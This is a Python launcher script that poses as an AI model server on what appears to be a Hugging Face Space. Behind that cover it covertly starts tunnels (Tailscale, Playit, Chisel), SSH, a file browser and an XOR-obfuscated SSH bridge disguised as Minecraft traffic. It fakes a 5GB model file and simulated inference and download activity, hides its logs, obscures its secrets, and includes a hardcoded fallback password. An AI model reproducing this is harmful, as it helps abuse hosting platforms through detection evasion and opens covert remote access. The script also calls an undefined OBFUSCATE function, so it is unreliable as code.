import os
import time
import subprocess
import base64
import threading
import random
import string
import sys
from loguru import logger

# Add parent directory of core to sys.path to allow absolute imports of services
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from services import nginx, tailscale, playit, chisel, minecraft, filebrowser

COVERT_LOGGING_MODE = 1

logger.info("--- BOOTING AI MODEL SERVER ---")

def decode_cmd(encoded_str):
    return base64.b64decode(encoded_str[::-1]).decode()

def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()

def deobfuscate_secret(hex_str, key=0x5A):
    if not hex_str:
        return ""
    try:
        raw_bytes = bytes.fromhex(hex_str)
        return bytes([b ^ key for b in raw_bytes]).decode('utf-8', errors='ignore')
    except Exception:
        return hex_str

def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)
        
        # CPU Jitter (Matrix math)
        try:
            logger.debug("Processing background inference batch...")
            import numpy as np
            a = np.random.randn(2000, 2000)
            b = np.random.randn(2000, 2000)
            _ = np.dot(a, b)
        except Exception:
            pass
            
        # Hub Mimic (Network traffic)
        try:
            logger.debug("Syncing model cache...")
            subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
        except Exception:
            pass

def main():
    # 1. Initialize Log Files immediately
    if COVERT_LOGGING_MODE == 1:
        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
        ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
        fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
        tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
        chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')
        nginx_log = open('/home/user/.torch_metrics/nginx.log', 'a')
    elif COVERT_LOGGING_MODE == 2:
        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
        class TeeLogger:
            def __init__(self, filepath, prefix):
                self.file = open(filepath, 'a')
                self.prefix = prefix
                r, w = os.pipe()
                self.r = r
                self.w = w
                threading.Thread(target=self._reader, daemon=True).start()

            def _reader(self):
                rf = os.fdopen(self.r, 'r', errors='replace')
                try:
                    for line in rf:
                        self.file.write(line)
                        self.file.flush()
                        sys.stdout.write(f"[{self.prefix}] {line}")
                        sys.stdout.flush()
                except Exception:
                    pass

            def fileno(self):
                return self.w

            def write(self, s):
                self.file.write(s)
                self.file.flush()
                sys.stdout.write(f"[{self.prefix}] {s}\n" if not s.endswith("\n") else f"[{self.prefix}] {s}")
                sys.stdout.flush()

            def flush(self):
                self.file.flush()
                sys.stdout.flush()

        ts_log = TeeLogger('/home/user/.torch_metrics/ts_daemon.log', 'TS')
        fb_log = TeeLogger('/home/user/.torch_metrics/fb.log', 'FB')
        tm_log = TeeLogger('/home/user/.torch_metrics/tm_daemon.log', 'PLAYIT')
        chisel_log = TeeLogger('/home/user/.torch_metrics/chisel.log', 'CHISEL')
        nginx_log = TeeLogger('/home/user/.torch_metrics/nginx.log', 'NGINX')
    else:
        devnull = open(os.devnull, 'w')
        ts_log = devnull
        fb_log = devnull
        tm_log = devnull
        chisel_log = devnull
        nginx_log = devnull

    # 2. Prep Filesystem:
    os.makedirs("/home/user/static", exist_ok=True)

    # 2.5 Start nginx on :7860 as smart frontend immediately so HF space binds/resolves port right away:
    nginx.start(nginx_log)

    # 3. Start the Gradio app (app.py) immediately in background on :7861:
    logger.info("Starting Gradio fake app (API server)...")
    cmd_app = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
    app_proc = subprocess.Popen(cmd_app, shell=True)

    # 4. Runtime Camouflage: Create the fake 5GB model file
    if not os.path.exists("/home/user/pytorch_model.bin"):
        logger.info("Pre-allocating model weight buffer...")
        subprocess.run(["truncate", "-s", "5G", "/home/user/pytorch_model.bin"])

    logger.info("Loading model weights into VRAM...")
    time.sleep(2)
    
    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()

    delay = random.randint(2, 3)
    logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")
    time.sleep(delay)

    # 5. Start Tailscale (python-cache-manager)
    tailscale.start_daemon(ts_log)
    
    time.sleep(2)
    logger.info("Warming up text-generation pipelines...")
    
    # Environment Variable Scrubbing (XOR Obfuscated Single Secrets)
    full_token = deobfuscate_secret(os.environ.get("A", "").strip())
    playit_token = deobfuscate_secret(os.environ.get("P", "").strip())
    chisel_auth = deobfuscate_secret(os.environ.get("C", "").strip())
    if not chisel_auth:
        chisel_auth = "user:apple123"
    
    # Erase the secrets from the environment immediately
    if "A" in os.environ: del os.environ["A"]
    if "P" in os.environ: del os.environ["P"]
    if "C" in os.environ: del os.environ["C"]

    # 6. Start File Browser (ai-metrics-collector)
    filebrowser.start(fb_log)

    # 7. Start Playit (tensor-allocator)
    playit.start(tm_log, playit_token)
    playit_token = ""

    # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
    chisel.start(chisel_log, chisel_auth)
    chisel_auth = ""
    
    # 9. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    tailscale.connect(ts_log, full_token)
    full_token = ""

    # 10. Configure SSH Password
    ssh_pwd = deobfuscate_secret(os.environ.get("PASS", "").strip())
    if ssh_pwd:
        logger.info("Setting SSH password from Hugging Face Secrets (PASS)...")
    else:
        ssh_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        logger.success(f"Generated SSH Password for 'user': {ssh_pwd}")
        
    try:
        subprocess.run(["sudo", "/usr/sbin/chpasswd"], input=f"user:{ssh_pwd}\n", text=True, check=True)
    except Exception as e:
        logger.error(f"Failed to set password: {e}")
    if "PASS" in os.environ:
        del os.environ["PASS"]

    # 11. Start SSHD on port 2222 (set in sshd_config at build time)
    subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
    
    # 12. Start Stealth XOR Bridge on Port 25564
    def xor_bridge():
        import socket
        XOR_KEY = 0x5A
        
        def pipe_xor(src, dst):
            try:
                while True:
                    data = src.recv(8192)
                    if not data:
                        break
                    scrambled = bytes([b ^ XOR_KEY for b in data])
                    dst.sendall(scrambled)
            except Exception:
                pass
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass

        def read_varint(sock):
            val = 0
            shift = 0
            while True:
                b = sock.recv(1)
                if not b:
                    break
                byte = b[0]
                val |= (byte & 0x7F) << shift
                if not (byte & 0x80):
                    break
                shift += 7
            return val

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", 25564))
            server.listen(10)
            while True:
                client_sock, addr = server.accept()
                try:
                    pkt_len = read_varint(client_sock)
                    if pkt_len > 0:
                        client_sock.recv(pkt_len)
                    
                    ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ssh_sock.connect(("127.0.0.1", 22))
                    threading.Thread(target=pipe_xor, args=(client_sock, ssh_sock), daemon=True).start()
                    threading.Thread(target=pipe_xor, args=(ssh_sock, client_sock), daemon=True).start()
                except Exception:
                    try: client_sock.close()
                    except: pass
        except Exception:
            pass

    threading.Thread(target=xor_bridge, daemon=True).start()

    # 13. Start Minecraft Stealth Daemon in Tmux
    minecraft.start()

    logger.success("Model loaded successfully. Background services active.")
    
    logger.info("Background services are active.")

    app_proc.wait()

if __name__ == "__main__":
    main()
